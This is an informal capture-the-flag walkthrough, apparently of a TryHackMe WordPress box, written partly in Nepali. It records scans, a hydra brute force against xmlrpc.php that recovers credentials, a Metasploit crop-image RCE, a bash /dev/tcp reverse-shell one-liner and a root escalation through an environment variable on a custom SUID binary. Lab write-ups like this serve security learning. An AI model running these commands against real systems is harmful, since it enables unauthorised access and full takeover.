nmapped and found 

```
# Nmap 7.80 scan initiated Tue Aug 19 06:50:15 2025 as: nmap -A -oN nmap 10.201.36.202
Nmap scan report for blog.thm (10.201.36.202)
Host is up (0.24s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.0
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-08-19T01:06:15
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Aug 19 06:51:24 2025 -- 1 IP address (1 host up) scanned in 68.53 seconds

```

found some file on smb
smbmapped first

```
[+] Guest session   	IP: 10.201.36.202:445	Name: blog.thm                                          
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	BillySMB                                          	READ, WRITE	Billy's local SMB Share
	.\BillySMB\*
	dr--r--r--                0 Tue Aug 19 07:33:24 2025	.
	dr--r--r--                0 Tue May 26 23:43:23 2020	..
	fr--r--r--            33378 Wed May 27 00:02:01 2020	Alice-White-Rabbit.jpg
	fr--r--r--          1236733 Tue May 26 23:58:45 2020	tswift.mp4
	fr--r--r--             3082 Tue May 26 23:58:43 2020	check-this.png
	IPC$                                              	NO ACCESS	IPC Service (blog server (Samba, Ubuntu))
```

got some files 
nothing on them, will check later

wpscan file:///home/namura/tryhackme/wpscan.json
now password ko lagi bruteforce hanne hoki
lets try that, lol session nai banda bhayo


also ffuf pani hudai thiyo

```
wp-content              [Status: 301, Size: 309, Words: 20, Lines: 10]
feed                    [Status: 301, Size: 0, Words: 1, Lines: 1]
rss                     [Status: 301, Size: 0, Words: 1, Lines: 1]
admin                   [Status: 302, Size: 0, Words: 1, Lines: 1]
wp-includes             [Status: 301, Size: 310, Words: 20, Lines: 10]
login                   [Status: 302, Size: 0, Words: 1, Lines: 1]
wp-admin                [Status: 301, Size: 307, Words: 20, Lines: 10]
w                       [Status: 301, Size: 0, Words: 1, Lines: 1]
no                      [Status: 301, Size: 0, Words: 1, Lines: 1]
welcome                 [Status: 301, Size: 0, Words: 1, Lines: 1]
dashboard               [Status: 302, Size: 0, Words: 1, Lines: 1]
n                       [Status: 301, Size: 0, Words: 1, Lines: 1]
0                       [Status: 301, Size: 0, Words: 1, Lines: 1]
embed                   [Status: 301, Size: 0, Words: 1, Lines: 1]
atom                    [Status: 301, Size: 0, Words: 1, Lines: 1]
}                       [Status: 301, Size: 0, Words: 1, Lines: 1]
not                     [Status: 301, Size: 0, Words: 1, Lines: 1]
rss2                    [Status: 301, Size: 0, Words: 1, Lines: 1]
note                    [Status: 301, Size: 0, Words: 1, Lines: 1]
server-status           [Status: 403, Size: 273, Words: 20, Lines: 10]
we                      [Status: 301, Size: 0, Words: 1, Lines: 1]
rdf                     [Status: 301, Size: 0, Words: 1, Lines: 1]
2020                    [Status: 301, Size: 0, Words: 1, Lines: 1]
fixed!                  [Status: 301, Size: 0, Words: 1, Lines: 1]
!                       [Status: 301, Size: 0, Words: 1, Lines: 1]
0000                    [Status: 301, Size: 0, Words: 1, Lines: 1]
N                       [Status: 301, Size: 0, Words: 1, Lines: 1]
W                       [Status: 301, Size: 0, Words: 1, Lines: 1]
Not                     [Status: 301, Size: 0, Words: 1, Lines: 1]
NO                      [Status: 301, Size: 0, Words: 1, Lines: 1]
NOT                     [Status: 301, Size: 0, Words: 1, Lines: 1]
No                      [Status: 301, Size: 0, Words: 1, Lines: 1]
Welcome                 [Status: 301, Size: 0, Words: 1, Lines: 1]
a0}                     [Status: 301, Size: 0, Words: 1, Lines: 1]

```

ani on the wpscan.json there was an rce wala which might be interesting

```
msf > search wordpress 5.0

Matching Modules
================

   #   Name                                                     Disclosure Date  Rank       Check  Description
   -   ----                                                     ---------------  ----       -----  -----------
   0   exploit/multi/http/wp_crop_rce                           2019-02-19       excellent  Yes    WordPress Crop-image Shell Upload

```


maybe im on the right path, yo auth rce ma passwd magdai raixa so maybe wpscan is gud for now 

lol
2 minutes in and still
```
0.00%  ETA: ??:??:??
```

enumerate gardai baseko xu, testo kei bhetidaina
sqli haru pani garna milxa jasto lagyo tara maybe auth is needed

hydra pani handim ki kya ho
bhetidaina ta,

```
namura@pop-os:~/tryhackme$ hydra -L users -P /opt/rockyou.txt blog.thm http-post-form "/xmlrpc.php:<?xml version='1.0'?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>^USER^</string></value></param><param><value><string>^PASS^</string></value></param></params></methodCall>:Invalid"
```

bhettiyooo

```
kwheel:cutiepie1
```

msfconsole ma kei hola jasto xa
lastai time lagne raixa j garda ni
server le garda ho ki kya ho
fucking hell

```
msf exploit(multi/http/wp_crop_rce) > run
[*] Started reverse TCP handler on 10.17.19.181:4444 
[*] Authenticating with WordPress using kwheel:cutiepie1...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload
[+] Image uploaded
[*] Including into theme
[*] Sending stage (40004 bytes) to 10.201.94.94
[*] Attempting to clean up files...
[*] 10.201.94.94 - Meterpreter session 1 closed.  Reason: Died
[*] Meterpreter session 1 opened (10.17.19.181:4444 -> 10.201.94.94:50438) at 2025-08-19 08:20:58 +0545
```

trying again 5 minute loss tait
yay aayo shell
pivoted from meterpreter shell to raw revshell using
`/bin/bash -c 'bash -i >& /dev/tcp/10.17.19.181/9001 0>&1'`

checked for suid and there are a ton of them 

```
   394827     60 -rwsr-xr-x   1 root     root        59640 Mar 22  2019 /usr/bin/passwd
   394810     40 -rwsr-xr-x   1 root     root        40344 Mar 22  2019 /usr/bin/newgrp
   394700     76 -rwsr-xr-x   1 root     root        75824 Mar 22  2019 /usr/bin/gpasswd
   394607     44 -rwsr-xr-x   1 root     root        44528 Mar 22  2019 /usr/bin/chsh
   394811     40 -rwsr-xr-x   1 root     root        37136 Mar 22  2019 /usr/bin/newuidmap
   394847     24 -rwsr-xr-x   1 root     root        22520 Mar 27  2019 /usr/bin/pkexec
   394605     76 -rwsr-xr-x   1 root     root        76496 Mar 22  2019 /usr/bin/chfn
   394952    148 -rwsr-xr-x   1 root     root       149080 Jan 31  2020 /usr/bin/sudo
   394554     52 -rwsr-sr-x   1 daemon   daemon      51464 Feb 20  2018 /usr/bin/at
   394809     40 -rwsr-xr-x   1 root     root        37136 Mar 22  2019 /usr/bin/newgidmap
   394988     20 -rwsr-xr-x   1 root     root        18448 Jun 28  2019 /usr/bin/traceroute6.iputils
   415459     12 -rwsr-sr-x   1 root     root         8432 May 26  2020 /usr/sbin/checker
   525644    100 -rwsr-xr-x   1 root     root       100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
   395173     44 -rwsr-xr--   1 root     messagebus    42992 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   400260    108 -rwsr-sr-x   1 root     root         109432 Oct 30  2019 /usr/lib/snapd/snap-confine
   395366     16 -rwsr-xr-x   1 root     root          14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
   395362    428 -rwsr-xr-x   1 root     root         436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
   395180     12 -rwsr-xr-x   1 root     root          10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
   524952     44 -rwsr-xr-x   1 root     root          43088 Mar  5  2020 /bin/mount
   524356     32 -rwsr-xr-x   1 root     root          30800 Aug 11  2016 /bin/fusermount
   524954     28 -rwsr-xr-x   1 root     root          26696 Mar  5  2020 /bin/umount
   524407     64 -rwsr-xr-x   1 root     root          64424 Jun 28  2019 /bin/ping
   524423     44 -rwsr-xr-x   1 root     root          44664 Mar 22  2019 /bin/su
       66     40 -rwsr-xr-x   1 root     root          40152 Oct 10  2019 /snap/core/8268/bin/mount
       80     44 -rwsr-xr-x   1 root     root          44168 May  7  2014 /snap/core/8268/bin/ping
       81     44 -rwsr-xr-x   1 root     root          44680 May  7  2014 /snap/core/8268/bin/ping6
       98     40 -rwsr-xr-x   1 root     root          40128 Mar 25  2019 /snap/core/8268/bin/su
      116     27 -rwsr-xr-x   1 root     root          27608 Oct 10  2019 /snap/core/8268/bin/umount
     2665     71 -rwsr-xr-x   1 root     root          71824 Mar 25  2019 /snap/core/8268/usr/bin/chfn
     2667     40 -rwsr-xr-x   1 root     root          40432 Mar 25  2019 /snap/core/8268/usr/bin/chsh
     2743     74 -rwsr-xr-x   1 root     root          75304 Mar 25  2019 /snap/core/8268/usr/bin/gpasswd
     2835     39 -rwsr-xr-x   1 root     root          39904 Mar 25  2019 /snap/core/8268/usr/bin/newgrp
     2848     53 -rwsr-xr-x   1 root     root          54256 Mar 25  2019 /snap/core/8268/usr/bin/passwd
     2958    134 -rwsr-xr-x   1 root     root         136808 Oct 11  2019 /snap/core/8268/usr/bin/sudo
     3057     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 10  2019 /snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     3427    419 -rwsr-xr-x   1 root     root              428240 Mar  4  2019 /snap/core/8268/usr/lib/openssh/ssh-keysign
     6462    105 -rwsr-sr-x   1 root     root              106696 Dec  6  2019 /snap/core/8268/usr/lib/snapd/snap-confine
     7636    386 -rwsr-xr--   1 root     dip               394984 Jun 12  2018 /snap/core/8268/usr/sbin/pppd
       66     40 -rwsr-xr-x   1 root     root               40152 Jan 27  2020 /snap/core/9066/bin/mount
       80     44 -rwsr-xr-x   1 root     root               44168 May  7  2014 /snap/core/9066/bin/ping
       81     44 -rwsr-xr-x   1 root     root               44680 May  7  2014 /snap/core/9066/bin/ping6
       98     40 -rwsr-xr-x   1 root     root               40128 Mar 25  2019 /snap/core/9066/bin/su
      116     27 -rwsr-xr-x   1 root     root               27608 Jan 27  2020 /snap/core/9066/bin/umount
     2670     71 -rwsr-xr-x   1 root     root               71824 Mar 25  2019 /snap/core/9066/usr/bin/chfn
     2672     40 -rwsr-xr-x   1 root     root               40432 Mar 25  2019 /snap/core/9066/usr/bin/chsh
     2748     74 -rwsr-xr-x   1 root     root               75304 Mar 25  2019 /snap/core/9066/usr/bin/gpasswd
     2840     39 -rwsr-xr-x   1 root     root               39904 Mar 25  2019 /snap/core/9066/usr/bin/newgrp
     2853     53 -rwsr-xr-x   1 root     root               54256 Mar 25  2019 /snap/core/9066/usr/bin/passwd
     2963    134 -rwsr-xr-x   1 root     root              136808 Jan 31  2020 /snap/core/9066/usr/bin/sudo
     3062     42 -rwsr-xr--   1 root     systemd-resolve    42992 Nov 29  2019 /snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     3432    419 -rwsr-xr-x   1 root     root              428240 Mar  4  2019 /snap/core/9066/usr/lib/openssh/ssh-keysign
     6470    109 -rwsr-xr-x   1 root     root              110792 Apr 10  2020 /snap/core/9066/usr/lib/snapd/snap-confine
     7646    386 -rwsr-xr--   1 root     dip               394984 Feb 11  2020 /snap/core/9066/usr/sbin/pppd

```

and wow, there was an custom one too
`   415459     12 -rwsr-sr-x   1 root     root         8432 May 26  2020 /usr/sbin/checker`

maybe reversing? dunno myan

```
/usr/sbin/checker
Not an Admin
file /usr/sbin/checker
file /usr/sbin/checker
/usr/sbin/checker: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6cdb17533a6e02b838336bfe9791b5d57e1e2eea, not stripped
strings /usr/sbin/checker

```

lol
![[Pasted image 20250819085902.png]]

did `export admin=admin`

and ran `/usr/sbin/checker`

got root
lol
ez

```
find / -type f -name "root.txt" 2>/dev/null
find / -type f -name "root.txt" 2>/dev/null
/root/root.txt
find / -type f -name "user.txt" 2>/dev/null
find / -type f -name "user.txt" 2>/dev/null
/home/bjoel/user.txt
/media/usb/user.txt
```

